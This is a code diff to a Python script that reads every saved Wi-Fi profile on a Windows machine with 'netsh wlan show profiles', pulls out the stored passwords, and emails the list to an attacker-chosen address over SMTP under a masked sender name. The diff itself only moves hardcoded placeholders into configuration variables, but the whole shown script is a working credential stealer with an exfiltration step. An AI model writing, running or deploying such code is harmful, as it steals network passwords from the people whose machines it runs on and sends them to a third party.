@@ -5,6 +5,21 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 
+# the email you want the data delivered to
+delivery_email = ''
+# your name
+name = ''
+# the email address the data will be sent FROM
+sending_email = ''
+# the password for the email address above
+sending_email_password = ''
+# please note that depending on the specific server, you may have to change the method
+# that uses the below parameters from SMTP_SSL() to SMTP() or something else
+# name of smtp server for email above (ex. smtp.gmail.com)
+smtp_name = ''
+# port number for smtp server (usually 25, 465, or 587)
+smtp_port = <NUM>
+
 finalList = ''
 
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -20,30 +35,26 @@ for network in networks:
     except IndexError:
         finalList += f'Name: {network}, Password: Not Read\n'
 
-
-target = '<YOUR_EMAIL_HERE>'
-# will appear in the From: section
-mask = '<YOUR_NAME_HERE>'
 # subject of email
 subject = 'Return'
 # message in body of email
 message = finalList
 
 # start mail server. YOU MAY HAVE TO CHANGE THE FUNCTION DEPENDING ON THE SERVER
-server = smtplib.SMTP_SSL('<SMTP_SERVER_NAME_HERE>', <SMTP_SERVER_PORT_HERE>)
+server = smtplib.SMTP_SSL(smtp_name, smtp_port)
 
 server.ehlo()
 
 # log in to mail server using a file (or just type password in)
-server.login('<EMAIL_THE_PASSWORDS_WILL_BE_SENT_FROM>', '<PASSWORD_FOR_EMAIL_HERE>')
+server.login(sending_email, sending_email_password)
 
 # creating the message:
 msg = MIMEMultipart()
-msg['From'] = mask
-msg['To'] = target
+msg['From'] = name
+msg['To'] = delivery_email
 msg['Subject'] = subject
 msg.attach(MIMEText(message, 'plain'))
 
 text = msg.as_string()
 
-server.sendmail('<EMAIL_THE_PASSWORDS_WILL_BE_SENT_FROM>', target, text)
+server.sendmail(sending_email, delivery_email, text)
